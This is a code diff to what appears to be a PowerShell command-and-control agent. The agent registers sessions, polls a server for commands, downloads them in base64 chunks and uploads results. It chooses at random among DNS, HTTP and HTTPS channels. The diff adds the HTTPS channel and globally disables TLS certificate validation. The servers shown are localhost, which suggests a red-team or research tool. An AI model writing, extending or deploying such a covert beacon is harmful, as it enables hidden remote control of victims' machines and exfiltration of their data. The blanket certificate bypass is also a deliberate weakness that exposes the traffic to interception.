@@ -4,15 +4,18 @@ $dnsChunkLength = 80 - $domain.Length
 if ($dnsChunkLength % 2 -ne 0) { $dnsChunkLength -= 1 }
 
 $httpAddr = "http://127.0.0.1:8088"
+$httpsAddr = "https://127.0.0.1:8443"
 $httpChunkLength = 1024
-
 
 $sessionId = "d8524193-809d-4f36-b65c-9a48ead7258e"
 $projectId = "7c377f4f-7ad9-47c8-8315-4e36a665c595"
 
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+
 $chunkLengths = @{
     DNS  = $dnsChunkLength
     HTTP = $httpChunkLength
+    HTTPS = $httpChunkLength
 }
 
 # Proportions of each channel, described as
@@ -20,6 +23,7 @@ $chunkLengths = @{
 $proportions = @{
     DNS  = 1
     HTTP = 1
+    HTTPS = 1
 }
 
 filter chunks {
@@ -286,6 +290,96 @@ function Send-ResultChunk-HTTP {
     Invoke-WebRequest -UseBasicParsing -Uri "$httpAddr/c/$commandId/$offset" -Method POST -Body "$payload"
 }
 
+# HTTPS Functions
+function Register-Session-HTTPS {
+    [CmdletBinding()]
+    param (
+        [Parameter()]
+        [String]
+        $sessionID,
+        [Parameter()]
+        [String]
+        $projectID
+    )
+    Invoke-RestMethod -Uri "$httpsAddr/$projectID/$sessionID" -Method PUT
+}
+
+function Get-CommandInfo-HTTPS {
+    (Invoke-WebRequest -UseBasicParsing -Uri "$httpsAddr/s/$sessionId" -Method GET).Content
+}
+
+function Get-CommandDetails-HTTPS {
+    [CmdletBinding()]
+    param (
+        [Parameter()]
+        [String]
+        $commandID
+    )
+
+    $currentOffset = 0
+    $isFinished = $false
+    $command = ""
+
+    while (-not $isFinished) {
+        [string]$stringOffset = $currentOffset
+        $response = Invoke-RestMethod -Uri "$httpsAddr/c/$commandID/$currentOffset" -Method GET
+
+        #        $response = $response -join ""
+        # decode response from base64
+        $response = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response))
+
+        $response = $response | ConvertFrom-Json
+
+        Write-Host "Response: $response"
+
+        $data = $response.data
+        $isFinished = $response.is_last_chunk
+        Write-Host "Is Finished: $isFinished"
+        $currentOffset += $data.Length
+        Write-Host "Current Offset: $currentOffset"
+        $command += $data
+    }
+
+    return $command
+}
+
+function Set-ResultLength-HTTPS {
+    [CmdletBinding()]
+    param (
+        [Parameter()]
+        [String]
+        $commandId,
+        [Parameter()]
+        [String]
+        $data
+    )
+
+    $dataToSend = $data | Out-String
+
+    $result_length = $dataToSend.Length
+
+    # send the length of the data
+    Invoke-RestMethod -Uri "$httpsAddr/c/$commandId/$result_length" -Method PATCH
+}
+
+function Send-ResultChunk-HTTPS {
+    [CmdletBinding()]
+    param (
+        [Parameter()]
+        [String]
+        $commandId,
+        [Parameter()]
+        [Int]
+        $offset,
+        [Parameter()]
+        [String]
+        $chunk
+    )
+
+    $payload = ([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($chunk)))
+    Invoke-WebRequest -UseBasicParsing -Uri "$httpsAddr/c/$commandId/$offset" -Method POST -Body "$payload"
+}
+
 # Main Functions
 function Register-Session {
     # randomly select a communication channel
@@ -296,6 +390,9 @@ function Register-Session {
     }
     elseif ($channel -eq "HTTP") {
         Register-Session-HTTP -sessionID $sessionId -projectID $projectId
+    }
+    elseif ($channel -eq "HTTPS") {
+        Register-Session-HTTPS -sessionID $sessionId -projectID $projectId
     }
     else {
         Write-Host "Unknown channel: $channel"
@@ -311,6 +408,9 @@ function Get-CommandInfo {
     }
     elseif ($channel -eq "HTTP") {
         return Get-CommandInfo-HTTP
+    }
+    elseif ($channel -eq "HTTPS") {
+        return Get-CommandInfo-HTTPS
     }
     else {
         Write-Host "Unknown channel: $channel"
@@ -333,6 +433,9 @@ function Get-CommandDetails {
     }
     elseif ($channel -eq "HTTP") {
         return Get-CommandDetails-HTTP -commandID $commandID
+    }
+    elseif ($channel -eq "HTTPS") {
+        return Get-CommandDetails-HTTPS -commandID $commandID
     }
     else {
         Write-Host "Unknown channel: $channel"
@@ -358,6 +461,9 @@ function Set-ResultLength {
     }
     elseif ($channel -eq "HTTP") {
         Set-ResultLength-HTTP -commandId $commandId -data $data
+    }
+    elseif ($channel -eq "HTTPS") {
+        Set-ResultLength-HTTPS -commandId $commandId -data $data
     }
     else {
         Write-Host "Unknown channel: $channel"
@@ -387,6 +493,9 @@ function Send-ResultChunk {
     }
     elseif ($channel -eq "HTTP") {
         Send-ResultChunk-HTTP -commandId $commandId -offset $offset -chunk $chunk
+    }
+    elseif ($channel -eq "HTTPS") {
+        Send-ResultChunk-HTTPS -commandId $commandId -offset $offset -chunk $chunk
     }
     else {
         Write-Host "Unknown channel: $channel"
